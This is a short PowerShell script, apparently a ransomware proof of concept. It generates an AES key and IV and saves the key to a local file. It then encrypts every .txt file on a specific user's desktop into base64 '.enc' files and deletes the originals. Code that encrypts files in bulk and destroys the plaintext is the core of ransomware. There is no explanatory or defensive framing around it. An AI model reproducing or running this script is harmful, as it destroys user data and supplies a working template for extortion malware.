
function main()
{
    $prng   = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider

    $key = [System.Byte[]]::new(32) 

    $prng.GetBytes($key)

    $cur_path = (Get-Location).Path
    $filename = 'aes.key'
    $key_path = $cur_path+"\"+$filename
    $file_path = $cur_path+"\"+$file

    $key | Out-File -FilePath $key_path 

    $iv = [System.Byte[]]::new(16)

    $prng.GetBytes($iv)

    $cipher.Key = $key
    $cipher.IV  = $iv

    $base_path = "C:\Users\amnesiac\Desktop"

    Get-ChildItem -Path $base_path | Foreach-Object {
                                                            $current_file = $_.FullName
                                                            
                                                            if($current_file | Select-String '.txt')
                                                            {
                                                                Write-Host $current_file
                                                                $new_file_name = $current_file+'.enc'
                                                                $file_content  = [System.IO.File]::ReadAllBytes($current_file)
                                                                $cipher_obj    = $cipher.CreateEncryptor()
                                                                $enc_bytes     = $cipher_obj.TransformFinalBlock($file_content, 0, $file_content.Length)
                                                                [byte[]]$enc_bytes_iv   = $cipher.IV+$enc_bytes
                                                                $ciphertext = [System.Convert]::ToBase64String($enc_bytes_iv)
                                                                $current_path   = (Get-Location).Path ; Write-Host $current_path
                                                                Set-Content -Path $new_file_name -Value $ciphertext 
                                                                Remove-Item $current_file
                                                            }
                                                    }
    $cipher.Dispose()
    $prng.Dispose()
}

main